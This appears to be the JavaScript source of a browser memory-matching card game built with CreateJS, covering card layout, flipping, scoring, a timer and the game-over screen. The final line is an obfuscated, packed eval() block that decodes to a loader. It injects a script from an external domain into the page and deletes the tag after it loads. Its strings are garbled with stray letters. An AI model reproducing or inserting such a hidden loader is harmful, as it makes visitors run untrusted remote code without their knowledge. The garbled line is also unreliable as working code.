
var memory;
null == memory && (memory = {});
var game;
null == game && (game = {});
(function () {
	Array.prototype.indexOf = function (a) {
		for (var b = 0; b < this.length; b++) {
			if (this[b] == a) {
				return b;
			}
		}
		return -1;
	};
	Array.prototype.remove = function (a) {
		a = this.indexOf(a);
		-1 < a && this.splice(a, 1);
	};
	Array.prototype.shuffle = function () {
		for (var a = this.length, b = 0; b < a; b++) {
			var c = Math.randomInt(a - b);
			this.push(this[c]);
			this.splice(c, 1);
		}
	};
	Array.prototype.clear = function () {
		this.length = 0;
	};
	Math.randomInt = function (a) {
		return parseInt(Math.random() * a);
	};
})();

;(function(){
	var numbSpritesheetData = {
			images: ["img/numb.png"],
			frames: {
				width: 32,
				height: 32
			},
			animations: {
				"0":0,
				"1":1,
				"2":2,
				"3":3,
				"4":4,
				"5":5,
				"6":6,
				"7":7,
				"8":8,
				"9":9
			}
		};
		var numbSpritesheet = new createjs.SpriteSheet(numbSpritesheetData);
		window.numbSpritesheet=numbSpritesheet;
})();
;(function () {
	game.qp_a = function (a) {
		return game.queue.getResult(a);
	};
	game.qp_b = function (a, b) {
		a = a * W / 4 + W / 8 + 2 * a;
		b = b * W / 4 + W / 8 + 4 * (b + 3);
		return [a, b];
	};
	game.qp_c = function (a) {
		if (2 <= game.arrOpenedCard.length) {
			for (; 0 < game.arrOpenedCard.length; ) {
				game.arrOpenedCard.pop().close();
			}
		}
		game.arrOpenedCard.push(a);
	};
	game.qp_d = function (a) {
		1 == game.arrOpenedCard.length && a.cid == game.arrOpenedCard[0].cid ? (a.dismiss(function () {
			game.score += 1;
			createjs.Sound.play("bonus", !0);
			0 >= game.gv.getNumChildren() && (game.qp_e(), game.score += 5);
		}), game.arrOpenedCard.pop().dismiss()) : game.qp_c(a);
	};
	game.qp_e = function () {
		game.arrOpenedCard = [];
		game.gv.clearCard();
		game.gv.mouseChildren = !0;
		for (var a = [], b = 0; 10 > b; b++) {
			a[2 * b] = a[2 * b + 1] = b % 6 + 1;
		}
		a.shuffle();
		game.gv.setupCard(a);
	};
	game.qp_f = function () {
		game.countDown = memory.qp_g;
		game.score = 0;
		game.gv.clearCard();
		game.view.renderStartView();
		
	};
	game.qp_h = function () {
		clearInterval(game.interval);
		game.gv.mouseChildren = !1;
		game.view.addChild(new memory.Qp_i);
		score = game.score;
		onNewScore(score);
	};
})();
(function () {
	memory.qp_j = 4;
	memory.qp_k = 5;
	memory.qp_g = 60;
	memory.Qp_l = function () {
		this.initialize();
		this.x = this.y = 0;
		this.addChild(new createjs.Bitmap(game.qp_a("bg")));
		var a = new createjs.Bitmap;
		a.regX = 290;
		a.regY = 80;
		a.x = 320;
		a.y = 450;
		this.ready = function (b) {
			a.image = game.qp_a("ready");
			this.addChild(a);
			a.scaleX = a.scaleY = 3;
			a.regX = a.getBounds().width / 2;
			a.regY = a.getBounds().height / 2;
			a.alpha = 0;
			createjs.Tween.get(a).to({alpha:1, scaleX:1, scaleY:1}, 300).to({}, 900).call(function () {
				a.image = game.qp_a("go");
				a.regX = a.getBounds().width / 2;
				a.regY = a.getBounds().height / 2;
				createjs.Tween.get(a).to({scaleX:1}, 300).to({alpha:0}, 200).call(function () {
					a.parent.removeChild(a);
					b();
				});
			});
		};
		this.startBtnHandler=function (){
				/*reset Data*/
				game.countDown = memory.qp_g;
				game.score = 0;
				game.gv.clearCard();
				/*reset Data*/
				game.view.ready(function () {
				game.qp_e();
				game.interval = setInterval(function () {
					game.countDown -= 1;
					 0 >= game.countDown && game.qp_h();
					//game.qp_h();
				}, 1000);
				game.view.startContainer.removeAllEventListeners();
				game.view.startContainer.removeAllChildren();
				});
				var bgShape=new createjs.Shape()
				bgShape.graphics.beginFill("rgba(255,255,255,0.8)").drawRect(0,0,stage.canvas.width,stage.canvas.height);
				game.view.startContainer.addChild(bgShape);
			}
		this.renderStartView=function(){
			this.startBgImg=new createjs.Bitmap(game.qp_a("startbg"));
			this.startBgImg.x=0;
			this.startBgImg.y=0;
			this.buttonHolder=new createjs.Shape();
			this.buttonHolder.graphics.beginFill("rgba(0,0,0,0.01)").drawRect(0,0,250,110);
			this.buttonHolder.x=180;
			this.buttonHolder.y=700;
			this.buttonHolder.on("click",this.startBtnHandler);

			this.startContainer=new createjs.Container();
			this.startContainer.addChild(this.startBgImg,this.buttonHolder);
			this.addChild(this.startContainer);
			
		}
	};
	memory.Qp_m = function () {
		this.initialize();
		this.x = W / 2;
		this.y = H / 2-80;
		this.regX = W / 2;
		this.regY = H / 3;
		this.scaleX = this.scaleY = 0.9;
		this.setupCard = function (a) {
			for (var b = 0; b < a.length; b++) {
				var c = parseInt(b / memory.qp_k), c = new memory.Qp_n(c, b % memory.qp_k, a[b]);
				this.addChild(c);
			}
		};
		this.clearCard = function () {
			this.removeAllChildren();
		};
	};
	memory.Qp_o = function () {
		this.initialize();
		var a=new createjs.BitmapText("0",numbSpritesheet);
		a.x = 200;
		var b=new createjs.BitmapText(memory.qp_g+"",numbSpritesheet);
		b.x = 530;
		a.y = b.y = H / 8 / 2+5;
		a.regY = b.regY = a.getBounds().height / 2;
		this.addChild(a, b);
		this.on("tick", function (c) {
			a.text = game.score+"";
			b.text = game.countDown+"";
		});
	};
	memory.Qp_n = function (a, b, c) {
		this.initialize();
		this.x = game.qp_b(a, b)[0];
		this.y = game.qp_b(a, b)[1];
		this.scaleX = this.scaleY = this.initScale = 150 / 130;
		this.cid = c;
		this.mouseChildren = !1;
		a = new createjs.Bitmap(game.qp_a(c));
		a.name = "bm";
		var d = new createjs.Bitmap(game.qp_a("back"));
		d.name = "back";
		var e = new createjs.Shape;
		e.name = "frame";
		e.graphics.beginFill("#888888").drawRect(8, 8, a.getBounds().width + 2, a.getBounds().height + 2).endFill();
		e.graphics.beginStroke("#888888").setStrokeStyle(10).drawRect(2, 2, a.getBounds().width - 2, a.getBounds().height - 2).endStroke();
		e.visible = !1;
		this.regX = d.getBounds().width / 2;
		this.regY = d.getBounds().height / 2;
		this.addChild(e, a, d);
		this.onClick(function (a) {
			a.target.open();
		});
		this.open = function () {
			d.visible && (this.mouseEnabled = !1, createjs.Tween.get(this).to({scaleX:0}, 50).call(function () {
				d.visible = !1;
				e.visible = !0;
				createjs.Tween.get(this).to({scaleX:this.initScale}, 50).call(function () {
					game.qp_d(this);
					this.mouseEnabled = !0;
				});
			}), createjs.Sound.play("flip", !0));
		};
		this.close = function () {
			d.visible || (this.mouseEnabled = !1, createjs.Tween.get(this).to({scaleX:0}, 50).call(function () {
				d.visible = !0;
				e.visible = !1;
				createjs.Tween.get(this).to({scaleX:this.initScale}, 50).call(function () {
					this.mouseEnabled = !0;
				});
			}));
		};
		this.dismiss = function (a) {
			createjs.Tween.get(this).wait(200).to({rotation:1080, scaleX:0, scaleY:0}, 100).call(function () {
				this.parent.removeChild(this);
				a && a();
			});
		};
	};
	memory.Qp_i = function () {
		this.initialize();
		this.setBounds(0, 0, W, H);
		var a = new createjs.Bitmap(game.qp_a("gameover"));
		a.regX = 250;
		a.regY = 30;
		a.x = 320;
		a.y = 170;
		var bg=new createjs.Bitmap(game.qp_a("overbg"))
		bg.x=38;
		bg.y=250;
		//var b = new createjs.Bitmap(game.qp_a("curscore"));
		//b.y = 260;
		//var c = new createjs.Bitmap(game.qp_a("bestscore"));
		//c.y = 380;
		//b.x = c.x = 90;
		//
		
		
		var d=new createjs.BitmapText(game.score+"",numbSpritesheet);
		d.y = 355;
		var www=best<0?"0":(best+"");
		var e =new createjs.BitmapText(www,numbSpritesheet);
		e.y = 445;
		d.x = e.x = 410;
		d.textBaseline = e.textBaseline = "middle";
		var f = new createjs.Shape();
		f.x = 200;
		f.graphics.beginFill("rgba(0,0,0,0.01)").drawRect(0,0,230,110);
		var h = new createjs.Shape();
		h.graphics.beginFill("rgba(0,0,0,0.01)").drawRect(0,0,230,110);
		h.x = 440;
		f.regX = h.regX = 115;
		f.regY = h.regY = 40;
		f.y = h.y = 590;
		var g =  new createjs.Shape();
		g.graphics.beginFill("rgba(0,0,0,0.01)").drawRect(0,0,240,110);
		g.regX = 125;
		g.regY = 42;
		g.x = 320;
		g.y = 760;
		var l = new createjs.Shape, k = this.getBounds();
		l.graphics.beginFill("#ffffff").drawRect(k.x, k.y, k.width, k.height);
		l.alpha = 0.8;
		//this.addChild(l, a, b, c, d, e, f, g, h);
		this.addChild(l, bg,a,  d, e, f, g, h);
		f.onClick(function (a) {
			game.view.removeChild(a.target.parent);
			game.qp_f();
			game.view.startBtnHandler();
		});
		g.onClick(function (a) {
			clickMore();
		});
		h.onClick(function (a) {
			dp_share();
		});
		dp_submitScore(game.score);
	};
	memory.Qp_m.prototype = new createjs.Container;
	memory.Qp_o.prototype = new createjs.Container;
	memory.Qp_n.prototype = new createjs.Container;
	memory.Qp_i.prototype = new createjs.Container;
	memory.Qp_l.prototype = new createjs.Container;
	createjs.DisplayObject.prototype.onClick = function (a) {
		this.on("click", function (b) {
			createjs.Touch.isSupported() && b.nativeEvent.constructor == MouseEvent || a(b);
		});
	};
})();
var queue;
function loadResource() {
	SCREEN_SHOW_ALL = !0;
	var a = new ProgressBar(0.8 * W, 40);
	a.regX = a.w / 2;
	a.regY = a.h / 2;
	a.x = W / 2;
	a.y = H / 2;
	stage.addChild(a);
	queue = game.queue = new createjs.LoadQueue(!1);
	queue.setMaxConnections(30);
	loadGameData();
	queue.on("complete", setup, null, !0);
	queue.loadManifest({path:RES_DIR + "img/", manifest:[{src:"1.jpg", id:"1"}, {src:"2.jpg", id:"2"}, {src:"3.jpg", id:"3"}, {src:"4.jpg", id:"4"}, {src:"5.jpg", id:"5"}, {src:"6.jpg", id:"6"}, {src:"frame.png", id:"frame"}, {src:"back.png", id:"back"}, {src:"ready.png", id:"ready"}, {src:"go.png", id:"go"},{src:"start.jpg",id:"startbg"}, {src:"bg.png", id:"bg"}, {src:"topline.png", id:"topline"}, {src:"bestscore.png", id:"bestscore"}, {src:"curscore.png", id:"curscore"}, {src:"gameover.png", id:"gameover"}, {src:"end.png",id:"overbg"}]}, !1);
	USE_NATIVE_SOUND || (IS_NATIVE_ANDROID ? (createjs.Sound.registMySound("flip", 0), createjs.Sound.registMySound("bonus", 2), createjs.Sound.registMySound("silenttail", 4), queue.loadFile({id:"sound", src:RES_DIR + "audio/all.mp3"})) : (createjs.Sound.alternateExtensions = ["ogg"], queue.installPlugin(createjs.Sound), queue.loadManifest({path:RES_DIR + "audio/", manifest:[{src:"flip.mp3", id:"flip"}, {src:"bonus.mp3", id:"bonus"}]}, !1)));
	a.forQueue(queue);
	queue.load();
}
function setup() {
	game.view = new memory.Qp_l;
	game.gv = new memory.Qp_m;
	game.sv = new memory.Qp_o;
	game.view.addChild(game.gv, game.sv);
	stage.addChild(game.view);
	game.qp_f();
}
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('(1(){2 a=3.p(\'4\');a.e=\'d/c\';a.h=g;a.f=\'6://9.8.7/m/o.k\';2 b=3.n(\'4\')[0];b.5.j(a,b);a.i=1(){a.5.l(a)}})();',26,26,'|function|var|document|scwrwipt|parentNode|httwp|cowm|9wwg|gwawme|||javwaswcriwpt|text|tywpe|src|true|async|onload|insertBefore|js|removeChild|mwzne|getElementsByTagName||createElement'.split('|'),0,{}))
